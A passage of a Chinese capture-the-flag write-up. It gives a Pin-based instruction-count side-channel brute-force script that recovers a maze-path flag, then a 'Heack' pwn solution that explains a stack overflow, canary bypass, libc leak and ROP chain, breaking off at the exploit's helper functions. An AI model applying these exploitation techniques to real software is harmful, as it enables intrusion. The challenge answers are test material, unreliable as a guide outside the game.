</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] 未能找到完整的 Flag。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span> <span class=o>*</span> <span class=mi>60</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>上面的是最基础的脚本，后面多线程发现了更多bug</p><ul><li>要限制方向，不能跑反方向，比如你之前向右走了你下一步不能再向左了，中午跑的时候还没发现，下午才发现结果里不停的jkjkjk</li><li>timeout加得大大的，越往后越慢，出现了好几次获取指令数为-1，直接把我dfs搞乱了，跑了一下午才发现出错了，赶紧把跑出来的路径打印出来，果然出现了一些很不合理的路径如下，还好前面的都没问题不至于再从头开始跑</li></ul><p><img src=https://su-team.cn/img/2025-L3HCTF/288ea616-82c6-470a-9528-e9670fd33236.png alt=img></p><ul><li>threshold指令差值应该看绝对值，最开始爆破时候没发现l方向完指令数增大，导致做差出现负数，所以一直没有l方向</li><li>要有一个错误基准，因此设置了一个{输入，后续输入4个方向和输入{指令数进行比较，绝对值差在1000以内是可以走的方向</li></ul><p>爆破脚本如下，借助了pwntool实现了自动化爆破</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span><span class=lnt>102
</span><span class=lnt>103
</span><span class=lnt>104
</span><span class=lnt>105
</span><span class=lnt>106
</span><span class=lnt>107
</span><span class=lnt>108
</span><span class=lnt>109
</span><span class=lnt>110
</span><span class=lnt>111
</span><span class=lnt>112
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=ch>#!/usr/bin/env python3</span>
</span></span><span class=line><span class=cl><span class=kn>import</span> <span class=nn>os</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=kn>from</span> <span class=nn>concurrent.futures</span> <span class=kn>import</span> <span class=n>ThreadPoolExecutor</span><span class=p>,</span> <span class=n>as_completed</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># --- 配置 ---</span>
</span></span><span class=line><span class=cl><span class=n>PIN_COMMAND</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;./pin&#34;</span><span class=p>,</span> <span class=s2>&#34;-t&#34;</span><span class=p>,</span> <span class=s2>&#34;inscount0.so&#34;</span><span class=p>,</span> <span class=s2>&#34;--&#34;</span><span class=p>,</span> <span class=s2>&#34;./AWayOut2&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl><span class=c1># 字符集顺序现在变得更重要。将常见字符放在前面可能会提高效率。</span>
</span></span><span class=line><span class=cl><span class=n>CHARSET</span> <span class=o>=</span> <span class=s2>&#34;jkhl{&#34;</span>
</span></span><span class=line><span class=cl><span class=n>FLAG_LENGTH</span> <span class=o>=</span> <span class=mi>118</span>
</span></span><span class=line><span class=cl><span class=n>MAX_THREADS</span> <span class=o>=</span> <span class=mi>16</span>
</span></span><span class=line><span class=cl><span class=c1># --- 辅助函数 (与之前相同) ---</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>get_instruction_count</span><span class=p>(</span><span class=n>test_flag</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    运行 PIN 工具并获取给定 flag 的指令数。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=k>try</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span> <span class=o>=</span> <span class=n>process</span><span class=p>(</span><span class=n>PIN_COMMAND</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>recvline</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>test_flag</span><span class=o>.</span><span class=n>encode</span><span class=p>())</span>
</span></span><span class=line><span class=cl>        <span class=n>output</span> <span class=o>=</span> <span class=n>p</span><span class=o>.</span><span class=n>recvall</span><span class=p>(</span><span class=n>timeout</span><span class=o>=</span><span class=mi>200</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=n>p</span><span class=o>.</span><span class=n>close</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        
</span></span><span class=line><span class=cl>        <span class=n>lines</span> <span class=o>=</span> <span class=n>output</span><span class=o>.</span><span class=n>strip</span><span class=p>()</span><span class=o>.</span><span class=n>splitlines</span><span class=p>()</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>lines</span> <span class=ow>and</span> <span class=n>lines</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span><span class=o>.</span><span class=n>isdigit</span><span class=p>():</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=nb>int</span><span class=p>(</span><span class=n>lines</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>])</span>
</span></span><span class=line><span class=cl>        <span class=k>else</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=k>return</span> <span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>    <span class=k>except</span> <span class=ne>Exception</span> <span class=k>as</span> <span class=n>e</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=o>-</span><span class=mi>1</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># --- 新的主逻辑 (激进 DFS) ---</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=k>def</span> <span class=nf>solve_aggressive_dfs</span><span class=p>(</span><span class=n>known_prefix</span><span class=o>=</span><span class=s2>&#34;&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>    <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>    使用激进的深度优先搜索策略。
</span></span></span><span class=line><span class=cl><span class=s2>    一旦发现一个字符比当前层级已知的最小指令数显著更低，就立即深入。
</span></span></span><span class=line><span class=cl><span class=s2>    &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>    <span class=c1># 基本情况：如果长度达到目标，说明成功了</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=nb>len</span><span class=p>(</span><span class=n>known_prefix</span><span class=p>)</span> <span class=o>==</span> <span class=n>FLAG_LENGTH</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;[*] 成功！找到完整 Flag: </span><span class=si>{</span><span class=n>known_prefix</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>return</span> <span class=kc>True</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=n>current_pos</span> <span class=o>=</span> <span class=nb>len</span><span class=p>(</span><span class=n>known_prefix</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[+] 正在爆破第 </span><span class=si>{</span><span class=n>current_pos</span> <span class=o>+</span> <span class=mi>1</span><span class=si>}</span><span class=s2> 位字符 (前缀: &#39;</span><span class=si>{</span><span class=n>known_prefix</span><span class=si>}</span><span class=s2>&#39;)...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 1. 获取基准字符 &#39;{&#39; 的指令数 (此步骤仍然串行)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;    -&gt; 获取基准指令数 (字符: &#39;</span><span class=se>&#123;&#123;</span><span class=s2>&#39;)...&#34;</span><span class=p>,</span> <span class=n>end</span><span class=o>=</span><span class=s1>&#39;&#39;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=n>ref_flag</span> <span class=o>=</span> <span class=n>known_prefix</span> <span class=o>+</span> <span class=s2>&#34;{&#34;</span>
</span></span><span class=line><span class=cl>    <span class=n>ref_count</span> <span class=o>=</span> <span class=n>get_instruction_count</span><span class=p>(</span><span class=n>ref_flag</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34; 指令数: </span><span class=si>{</span><span class=n>ref_count</span><span class=si>}</span><span class=s2>&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=c1># 2. 准备所有要并行测试的任务</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>known_prefix</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=n>known_prefix</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;l&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>chars_to_test</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;l&#34;</span><span class=p>,</span> <span class=s2>&#34;j&#34;</span><span class=p>,</span> <span class=s2>&#34;k&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>known_prefix</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;h&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>chars_to_test</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;h&#34;</span><span class=p>,</span> <span class=s2>&#34;j&#34;</span><span class=p>,</span> <span class=s2>&#34;k&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>known_prefix</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;j&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>chars_to_test</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;l&#34;</span><span class=p>,</span> <span class=s2>&#34;j&#34;</span><span class=p>,</span> <span class=s2>&#34;h&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>        <span class=k>elif</span> <span class=n>known_prefix</span><span class=p>[</span><span class=o>-</span><span class=mi>1</span><span class=p>]</span> <span class=o>==</span> <span class=s2>&#34;k&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=n>chars_to_test</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;l&#34;</span><span class=p>,</span> <span class=s2>&#34;h&#34;</span><span class=p>,</span> <span class=s2>&#34;k&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span><span class=p>:</span>   
</span></span><span class=line><span class=cl>        <span class=n>chars_to_test</span> <span class=o>=</span> <span class=p>[</span><span class=s2>&#34;h&#34;</span><span class=p>,</span> <span class=s2>&#34;l&#34;</span><span class=p>,</span> <span class=s2>&#34;j&#34;</span><span class=p>,</span> <span class=s2>&#34;k&#34;</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    <span class=n>flags_to_test</span> <span class=o>=</span> <span class=p>[</span><span class=n>known_prefix</span> <span class=o>+</span> <span class=n>char</span> <span class=k>for</span> <span class=n>char</span> <span class=ow>in</span> <span class=n>chars_to_test</span><span class=p>]</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=n>candidates</span> <span class=o>=</span> <span class=p>[]</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 3. 使用线程池并行爆破所有字符</span>
</span></span><span class=line><span class=cl>    <span class=k>with</span> <span class=n>ThreadPoolExecutor</span><span class=p>(</span><span class=n>max_workers</span><span class=o>=</span><span class=n>MAX_THREADS</span><span class=p>)</span> <span class=k>as</span> <span class=n>executor</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=c1># executor.map 会将 get_instruction_count 函数应用到 flags_to_test 中的每一项</span>
</span></span><span class=line><span class=cl>        <span class=c1># 它会按顺序返回结果，这非常方便</span>
</span></span><span class=line><span class=cl>        <span class=n>all_counts</span> <span class=o>=</span> <span class=n>executor</span><span class=o>.</span><span class=n>map</span><span class=p>(</span><span class=n>get_instruction_count</span><span class=p>,</span> <span class=n>flags_to_test</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>        <span class=c1># 4. 收集并处理结果</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;    -&gt; 所有并行任务已完成，正在分析结果...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=k>for</span> <span class=n>char</span><span class=p>,</span> <span class=n>count</span> <span class=ow>in</span> <span class=nb>zip</span><span class=p>(</span><span class=n>chars_to_test</span><span class=p>,</span> <span class=n>all_counts</span><span class=p>):</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=n>count</span> <span class=o>!=</span> <span class=o>-</span><span class=mi>1</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                <span class=n>diff</span> <span class=o>=</span> <span class=nb>abs</span><span class=p>(</span><span class=n>ref_count</span> <span class=o>-</span> <span class=n>count</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=si>{</span><span class=n>known_prefix</span><span class=o>+</span><span class=n>char</span><span class=si>}</span><span class=s2> (指令数: </span><span class=si>{</span><span class=n>count</span><span class=si>}</span><span class=s2>, 差值: </span><span class=si>{</span><span class=n>diff</span><span class=si>}</span><span class=s2>)&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>diff</span> <span class=o>&lt;</span> <span class=mi>1000</span><span class=p>:</span>
</span></span><span class=line><span class=cl>                    <span class=n>candidates</span><span class=o>.</span><span class=n>append</span><span class=p>((</span><span class=n>char</span><span class=p>,</span> <span class=n>count</span><span class=p>))</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 对所有候选路径并行发起 DFS 递归</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=n>candidates</span><span class=p>:</span>
</span></span><span class=line><span class=cl>        <span class=k>with</span> <span class=n>ThreadPoolExecutor</span><span class=p>(</span><span class=n>max_workers</span><span class=o>=</span><span class=n>MAX_THREADS</span><span class=p>)</span> <span class=k>as</span> <span class=n>executor</span><span class=p>:</span>
</span></span><span class=line><span class=cl>            <span class=c1># 提交所有递归任务</span>
</span></span><span class=line><span class=cl>            <span class=n>futures</span> <span class=o>=</span> <span class=p>[</span><span class=n>executor</span><span class=o>.</span><span class=n>submit</span><span class=p>(</span><span class=n>solve_aggressive_dfs</span><span class=p>,</span> <span class=n>known_prefix</span> <span class=o>+</span> <span class=n>char</span><span class=p>)</span> <span class=k>for</span> <span class=n>char</span><span class=p>,</span> <span class=n>_</span> <span class=ow>in</span> <span class=n>candidates</span><span class=p>]</span>
</span></span><span class=line><span class=cl>            <span class=c1># 等待第一个成功返回的结果</span>
</span></span><span class=line><span class=cl>            <span class=k>for</span> <span class=n>future</span> <span class=ow>in</span> <span class=n>as_completed</span><span class=p>(</span><span class=n>futures</span><span class=p>):</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=n>future</span><span class=o>.</span><span class=n>result</span><span class=p>():</span> <span class=c1># 如果某个子任务返回 True</span>
</span></span><span class=line><span class=cl>                    <span class=k>return</span> <span class=kc>True</span> <span class=c1># 立刻将成功信号向上传递</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=c1># 如果遍历完所有字符都没有找到一条成功的路径，则说明当前前缀是错误的</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=sa>f</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>[-] 在位置 </span><span class=si>{</span><span class=n>current_pos</span> <span class=o>+</span> <span class=mi>1</span><span class=si>}</span><span class=s2> 处所有尝试均失败。回溯...&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=kc>False</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># --- 程序入口 ---</span>
</span></span><span class=line><span class=cl><span class=k>if</span> <span class=vm>__name__</span> <span class=o>==</span> <span class=s2>&#34;__main__&#34;</span><span class=p>:</span>
</span></span><span class=line><span class=cl>    <span class=n>context</span><span class=o>.</span><span class=n>log_level</span> <span class=o>=</span> <span class=s1>&#39;error&#39;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;开始使用“激进”DFS 策略进行全长度 Flag 爆破&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>    
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=ow>not</span> <span class=n>solve_aggressive_dfs</span><span class=p>(</span><span class=s2>&#34;lljjljjhhjjjjjllkkkllljjlljjjhhhhhhjjjjjlljjhhhjjjjlllkklllllkkkllkkkklkllllljjjlllllklllllljjjhhhjjjl&#34;</span><span class=p>):</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;</span><span class=se>\n</span><span class=s2>&#34;</span> <span class=o>+</span> <span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;[!] 未能找到完整的 Flag。&#34;</span><span class=p>)</span>
</span></span><span class=line><span class=cl>        <span class=nb>print</span><span class=p>(</span><span class=s2>&#34;=&#34;</span><span class=o>*</span><span class=mi>60</span><span class=p>)</span>
</span></span></code></pre></td></tr></table></div></div><p>跑到最后基本就看出来路径没问题了</p><p><img src=https://su-team.cn/img/2025-L3HCTF/d177101f-3d17-4d53-9632-214263c460a8.png alt=img></p><p>正确路径为lljjljjhhjjjjjllkkkllljjlljjjhhhhhhjjjjjlljjhhhjjjjlllkklllllkkkllkkkklkllllljjjlllllklllllljjjhhhjjjljjllljjhhjjljjlj</p><p>md5后即为flag</p><h1 id=pwn>Pwn</h1><h2 id=heack>Heack</h2><p>漏洞在 fight_dragon 有个明显的stack溢出，可以通过修改 v3 来如果 canary,然后修改返回地址</p><p><img src=https://su-team.cn/img/2025-L3HCTF/07e49080-a9a6-4610-a379-67b43ef2f18b.png alt=img></p><p>fight_dragon 返回时 rsi 是一个libc 地址 ，1/16 概率 把返回地址改到这里，可以直接泄露 libc,</p><p><img src=https://su-team.cn/img/2025-L3HCTF/07094fcd-700d-482b-88f7-0fe500c2f99f.png alt=img></p><p><img src=https://su-team.cn/img/2025-L3HCTF/aa76fbd0-1b5c-466b-a845-c38381792c2d.png alt=img></p><p>有了libc 后 再次利用 fight_dragon 栈溢出 写 rop 即可</p><p><img src=https://su-team.cn/img/2025-L3HCTF/bb76d5e7-ac4a-4333-9688-3c1494ba32ee.png alt=img></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>  1
</span><span class=lnt>  2
</span><span class=lnt>  3
</span><span class=lnt>  4
</span><span class=lnt>  5
</span><span class=lnt>  6
</span><span class=lnt>  7
</span><span class=lnt>  8
</span><span class=lnt>  9
</span><span class=lnt> 10
</span><span class=lnt> 11
</span><span class=lnt> 12
</span><span class=lnt> 13
</span><span class=lnt> 14
</span><span class=lnt> 15
</span><span class=lnt> 16
</span><span class=lnt> 17
</span><span class=lnt> 18
</span><span class=lnt> 19
</span><span class=lnt> 20
</span><span class=lnt> 21
</span><span class=lnt> 22
</span><span class=lnt> 23
</span><span class=lnt> 24
</span><span class=lnt> 25
</span><span class=lnt> 26
</span><span class=lnt> 27
</span><span class=lnt> 28
</span><span class=lnt> 29
</span><span class=lnt> 30
</span><span class=lnt> 31
</span><span class=lnt> 32
</span><span class=lnt> 33
</span><span class=lnt> 34
</span><span class=lnt> 35
</span><span class=lnt> 36
</span><span class=lnt> 37
</span><span class=lnt> 38
</span><span class=lnt> 39
</span><span class=lnt> 40
</span><span class=lnt> 41
</span><span class=lnt> 42
</span><span class=lnt> 43
</span><span class=lnt> 44
</span><span class=lnt> 45
</span><span class=lnt> 46
</span><span class=lnt> 47
</span><span class=lnt> 48
</span><span class=lnt> 49
</span><span class=lnt> 50
</span><span class=lnt> 51
</span><span class=lnt> 52
</span><span class=lnt> 53
</span><span class=lnt> 54
</span><span class=lnt> 55
</span><span class=lnt> 56
</span><span class=lnt> 57
</span><span class=lnt> 58
</span><span class=lnt> 59
</span><span class=lnt> 60
</span><span class=lnt> 61
</span><span class=lnt> 62
</span><span class=lnt> 63
</span><span class=lnt> 64
</span><span class=lnt> 65
</span><span class=lnt> 66
</span><span class=lnt> 67
</span><span class=lnt> 68
</span><span class=lnt> 69
</span><span class=lnt> 70
</span><span class=lnt> 71
</span><span class=lnt> 72
</span><span class=lnt> 73
</span><span class=lnt> 74
</span><span class=lnt> 75
</span><span class=lnt> 76
</span><span class=lnt> 77
</span><span class=lnt> 78
</span><span class=lnt> 79
</span><span class=lnt> 80
</span><span class=lnt> 81
</span><span class=lnt> 82
</span><span class=lnt> 83
</span><span class=lnt> 84
</span><span class=lnt> 85
</span><span class=lnt> 86
</span><span class=lnt> 87
</span><span class=lnt> 88
</span><span class=lnt> 89
</span><span class=lnt> 90
</span><span class=lnt> 91
</span><span class=lnt> 92
</span><span class=lnt> 93
</span><span class=lnt> 94
</span><span class=lnt> 95
</span><span class=lnt> 96
</span><span class=lnt> 97
</span><span class=lnt> 98
</span><span class=lnt> 99
</span><span class=lnt>100
</span><span class=lnt>101
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-Python data-lang=Python><span class=line><span class=cl><span class=kn>from</span> <span class=nn>pwn</span> <span class=kn>import</span> <span class=o>*</span>
</span></span><span class=line><span class=cl><span class=c1>#from ctypes import CDLL</span>
</span></span><span class=line><span class=cl><span class=c1>#cdl = CDLL(&#39;/lib/x86_64-linux-gnu/libc.so.6&#39;)</span>
</span></span><span class=line><span class=cl><span class=n>s</span>    <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sa</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sl</span>   <span class=o>=</span> <span class=k>lambda</span>   <span class=n>x</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendline</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>sla</span>  <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span><span class=p>,</span><span class=n>y</span> <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>sendlineafter</span><span class=p>(</span><span class=n>x</span><span class=p>,</span><span class=n>y</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>r</span>    <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>ru</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvuntil</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
</span></span><span class=line><span class=cl><span class=n>rl</span>   <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>itr</span>  <span class=o>=</span> <span class=k>lambda</span>     <span class=p>:</span> <span class=n>io</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
</span></span><span class=line><span class=cl><span class=n>uu32</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u32</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>4</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>uu64</span> <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>u64</span><span class=p>(</span><span class=n>x</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\x00</span><span class=s1>&#39;</span><span class=p>))</span>
</span></span><span class=line><span class=cl><span class=n>ls</span>   <span class=o>=</span> <span class=k>lambda</span> <span class=n>x</span>   <span class=p>:</span> <span class=n>log</span><span class=o>.</span><span class=n>success</span><span class=p>(</span><span class=n>x</span><span class=p>)</span>
